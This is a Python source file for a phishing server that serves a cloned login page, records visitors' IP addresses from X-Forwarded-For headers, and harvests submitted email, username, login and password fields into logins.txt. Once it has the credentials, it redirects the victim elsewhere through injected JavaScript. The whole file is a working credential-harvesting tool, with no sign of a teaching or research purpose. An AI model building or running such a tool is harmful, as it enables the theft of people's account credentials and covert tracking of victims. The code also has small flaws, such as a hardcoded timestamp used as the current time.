from http.server import HTTPServer, BaseHTTPRequestHandler
from datetime import datetime
from io import BytesIO
import urllib.request
import re

class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
    
    ips = []

    def run():
        try:
            running = False
            port = input(BLUE+BOLD+"Port number: "+ENDC)
            httpd = HTTPServer(('0.0.0.0', int(port)), SimpleHTTPRequestHandler)
            while not running:
                print(BOLD+BLUE+'.::Listening on port %s...\n'%(port)+ENDC)
                httpd.serve_forever()
        except OSError:
            print(RED+"Adress already in use!\n"+ENDC)
            quit()

    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        file = open('site/index.html','r')
        readfile = file.readlines()
        for lines in readfile:
            self.wfile.write(lines.encode())
        self.get_ip()
        
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        body = self.rfile.read(content_length)
        self.send_response(200)
        self.end_headers()
        response = BytesIO()
        response.write(body)
        values = response.getvalue()
        self.getCredentials(values)

    def get_ip(self):
        log = str(self.headers).split('\n')
        try:
            temp = self.ips[-1]
        except IndexError:
            temp = ''

        for lines in log:
            if re.search('^'+'X-Forwarded-For',lines):
                address = lines.split('X-Forwarded-For: ')
                if not address[1] in self.ips:
                    date = self.get_time()
                    self.ips.append(address[1])
                    file = open('ips.txt','a+')
                    file.write('Date: '+str(date)+' IP: '+str(address[1])+'\n')
        try:
            if temp != self.ips[-1]:
                print(BOLD+RED+'[+]IP Found:',self.ips[-1],ENDC)
        except IndexError:
            pass
            
    def get_time(self):
        timestamp = 1545730073
        timenow = datetime.fromtimestamp(timestamp)
        return timenow

    def getCredentials(self, values):
        post = values.decode('UTF-8')
        readpost = post.strip('&')
        forms = ['email','user','login','pass'] #Possibles forms to get the credentials
        readpost = readpost.split('&')
        count = 0
        possibles = []
        file = open('logins.txt','a+')
        for line in readpost:
            for c in forms:
                if c in line and re.search("^"+str(c),line) and len(line) > 0:
                    possibles.append(line)
                    count +=1
                    if count >= 2:
                        print('\n' + BOLD+RED + "=" * 15 + " Possible Credentials " + "=" * 15)
                        print('[+].::',possibles)
                        print("=" * 52 + "\n"+ENDC)
                        date = self.get_time()
                        file.write(str(date)+' '+str(possibles)+'\n')
                        count = 0
                        possibles = []
                        self.redirect()
        file.close()

    def redirect(self):
        urlf = open('site/redirect.txt','r')
        url = urlf.readlines()
        print(BLUE+"[!] Redirecting...")
        redir = "<script>window.location.href=\"%s\"</script>" % (url[0])
        self.wfile.write(redir.encode())
        print('[+] Done!'+ENDC)


'''colors'''
BLUE = '\033[94m'
RED = '\033[91m'
ENDC = '\033[0m'
BOLD = '\033[1m'